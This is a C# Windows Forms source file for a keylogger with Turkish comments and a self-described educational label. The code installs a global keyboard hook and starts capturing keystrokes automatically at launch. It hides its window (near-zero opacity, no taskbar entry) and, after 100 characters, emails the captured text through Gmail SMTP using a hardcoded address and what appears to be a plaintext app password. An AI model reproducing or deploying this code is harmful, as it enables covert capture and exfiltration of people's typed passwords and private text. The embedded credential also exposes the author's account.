using System;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Text;
using System.Net;
using System.Net.Mail;

namespace KeyLogger
{
    public partial class Form1 : Form
    {
        private TextBox txtLog;
        private Button btnStart, btnStop, btnClear, btnSave;
        private Label lblStatus;
        private LowLevelKeyboardHook _keyboardHook;
        private string logFilePath;
        private int charCount = 0;
        private const int MaxCharCount = 100;

        public Form1()
        {
            CreateForm();
            StartKeylogger(); // VS'den başlatıldığında otomatik başlar
        }

        private void CreateForm()
        {
            // Form ayarları
            this.Size = new Size(500, 400);
            this.Text = "Keylogger - Eğitim Amaçlı";

            txtLog = new TextBox();
            txtLog.Multiline = true;
            txtLog.ScrollBars = ScrollBars.Vertical;
            txtLog.Location = new Point(12, 50);
            txtLog.Size = new Size(460, 300);
            txtLog.ReadOnly = true;
            this.Controls.Add(txtLog);

            btnStart = new Button();
            btnStart.Text = "Başlat";
            btnStart.Location = new Point(12, 12);
            btnStart.Size = new Size(75, 30);
            this.Controls.Add(btnStart);

            btnStop = new Button();
            btnStop.Text = "Durdur";
            btnStop.Location = new Point(93, 12);
            btnStop.Size = new Size(75, 30);
            btnStop.Enabled = false;
            this.Controls.Add(btnStop);

            btnClear = new Button();
            btnClear.Text = "Temizle";
            btnClear.Location = new Point(174, 12);
            btnClear.Size = new Size(75, 30);
            this.Controls.Add(btnClear);

            btnSave = new Button();
            btnSave.Text = "Kaydet";
            btnSave.Location = new Point(255, 12);
            btnSave.Size = new Size(75, 30);
            this.Controls.Add(btnSave);

            lblStatus = new Label();
            lblStatus.Text = "Durum: Durduruldu";
            lblStatus.Location = new Point(350, 18);
            lblStatus.AutoSize = true;
            this.Controls.Add(lblStatus);

            logFilePath = Path.Combine(Application.StartupPath, "keylog_educational.txt");

            btnStart.Click += btnStart_Click;
            btnStop.Click += btnStop_Click;
            btnClear.Click += btnClear_Click;
            btnSave.Click += btnSave_Click;
        }

        private void StartKeylogger()
        {
            _keyboardHook = new LowLevelKeyboardHook();
            _keyboardHook.OnKeyPressed += Hook_OnKeyPressed;
            _keyboardHook.HookKeyboard();
            lblStatus.Text = "Durum: Kayıt Aktif";
            txtLog.AppendText("=== KAYIT BAŞLATILDI ===\r\n");
        }

        private void StopKeylogger()
        {
            if (_keyboardHook != null)
            {
                _keyboardHook.UnHookKeyboard();
                _keyboardHook.OnKeyPressed -= Hook_OnKeyPressed;
            }
            lblStatus.Text = "Durum: Durduruldu";
            txtLog.AppendText("=== KAYIT DURDURULDU ===\r\n");

            SendLogByEmail(txtLog.Text); 

            Application.Exit();
        }

        private void SendLogByEmail(string logText)
        {
            try
            {
                var mail = new MailMessage();
                mail.From = new MailAddress("meeryemtekeli@gmail.com");
                mail.To.Add("meeryemtekeli@gmail.com");
                mail.Subject = "Keylogger Log";
                mail.Body = "Eğitim Amaçlı Yapılan Basit Keylogger Uygulaması İçin Yazdığınız Metin:\r\n\r\n" + logText;


                var smtp = new SmtpClient("smtp.gmail.com", 587);
                smtp.Credentials = new NetworkCredential("meeryemtekeli@gmail.com", "dacy hcux xgtl nuoq"); 
                smtp.EnableSsl = true;
                smtp.Send(mail);

            }
            catch (Exception ex)
            {
                MessageBox.Show("Mail gönderilemedi: " + ex.Message);
            }
        }

        // Form1.cs dosyanızda aşağıdaki event handler'ları ekleyin.
        // Eğer eksikse, bunları Form1 sınıfının içine ekleyin.

        private void btnStart_Click(object sender, EventArgs e)
        {
            try
            {
                _keyboardHook = new LowLevelKeyboardHook();
                _keyboardHook.OnKeyPressed += Hook_OnKeyPressed;
                _keyboardHook.HookKeyboard();

                btnStart.Enabled = false;
                btnStop.Enabled = true;
                lblStatus.Text = "Durum: Kayıt Aktif";
                txtLog.AppendText("=== KAYIT BAŞLATILDI ===\r\n");
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Hata: {ex.Message}");
            }
        }

        private void btnStop_Click(object sender, EventArgs e)
        {
            try
            {
                if (_keyboardHook != null)
                {
                    _keyboardHook.UnHookKeyboard();
                    _keyboardHook.OnKeyPressed -= Hook_OnKeyPressed;
                }

                btnStart.Enabled = true;
                btnStop.Enabled = false;
                lblStatus.Text = "Durum: Durduruldu";
                txtLog.AppendText("=== KAYIT DURDURULDU ===\r\n");
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Hata: {ex.Message}");
            }
        }

        private void btnClear_Click(object sender, EventArgs e)
        {
            txtLog.Clear();
        }

        private void btnSave_Click(object sender, EventArgs e)
        {
            try
            {
                File.WriteAllText(logFilePath, txtLog.Text);
                MessageBox.Show($"Log kaydedildi: {logFilePath}", "Bilgi");
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Kaydetme hatası: {ex.Message}", "Hata");
            }
        }

        private void Hook_OnKeyPressed(object sender, Keys key)
        {
            if (txtLog.InvokeRequired)
            {
                txtLog.Invoke(new Action(() => AddKeyToLog(key)));
            }
            else
            {
                AddKeyToLog(key);
            }
        }

        private void AddKeyToLog(Keys key)
        {
            if (charCount >= MaxCharCount)
            {
                StopKeylogger();
                return;
            }

            string before = txtLog.Text;
            if (key == Keys.Space)
                txtLog.AppendText(" ");
            else if (key == Keys.Enter)
                txtLog.AppendText(Environment.NewLine);
            else if (key == Keys.Back)
            {
                if (txtLog.Text.Length > 0)
                    txtLog.Text = txtLog.Text.Substring(0, txtLog.Text.Length - 1);
            }
            else if (key == Keys.Tab)
                txtLog.AppendText("\t");
            else
            {
                string character = GetCharFromKey((int)key);
                if (!string.IsNullOrEmpty(character))
                    txtLog.AppendText(character);
            }
            charCount += txtLog.Text.Length - before.Length;
        }

        [DllImport("user32.dll")]
        static extern short GetKeyState(int nVirtKey);

        [DllImport("user32.dll")]
        static extern int ToUnicode(
            uint wVirtKey,
            uint wScanCode,
            byte[] lpKeyState,
            [Out, MarshalAs(UnmanagedType.LPWStr, SizeParamIndex = 4)]
            StringBuilder pwszBuff,
            int cchBuff,
            uint wFlags);

        private string GetCharFromKey(int vkCode)
        {
            byte[] keyboardState = new byte[256];
            for (int i = 0; i < 256; i++)
                keyboardState[i] = (byte)(GetKeyState(i) & 0xff);

            uint scanCode = 0;
            var sb = new StringBuilder(2);
            int result = ToUnicode((uint)vkCode, scanCode, keyboardState, sb, sb.Capacity, 0);
            if (result > 0)
                return sb.ToString();
            return "";
        }
        //  Formun şeffaf olması için:
        protected override void OnLoad(EventArgs e)
        {
            base.OnLoad(e);
            this.BackColor = Color.Lime;
            this.TransparencyKey = Color.Lime;
            this.FormBorderStyle = FormBorderStyle.None;
            this.TopMost = true;
            this.ShowInTaskbar = false;
            this.Opacity = 0.01; // Neredeyse tamamen şeffaf
        }
    }

    public class LowLevelKeyboardHook
    {
        public event EventHandler<Keys> OnKeyPressed;

        [DllImport("user32.dll")]
        static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc callback, IntPtr hInstance, uint threadId);

        [DllImport("user32.dll")]
        static extern bool UnhookWindowsHookEx(IntPtr hInstance);

        [DllImport("user32.dll")]
        static extern IntPtr CallNextHookEx(IntPtr idHook, int nCode, int wParam, IntPtr lParam);

        [DllImport("kernel32.dll")]
        static extern IntPtr LoadLibrary(string lpFileName);

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private LowLevelKeyboardProc _proc;
        private IntPtr _hookID = IntPtr.Zero;

        public void HookKeyboard()
        {
            _proc = HookCallback;
            _hookID = SetHook(_proc);
        }

        public void UnHookKeyboard()
        {
            UnhookWindowsHookEx(_hookID);
        }

        private IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (var curProcess = System.Diagnostics.Process.GetCurrentProcess())
            using (var curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(13, proc, LoadLibrary(curModule.ModuleName), 0);
            }
        }

        private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0)
            {
                int vkCode = Marshal.ReadInt32(lParam);

                if (wParam == (IntPtr)0x100)
                {
                    OnKeyPressed?.Invoke(this, (Keys)vkCode);
                }
            }

            return CallNextHookEx(_hookID, nCode, (int)wParam, lParam);
        }
    }
}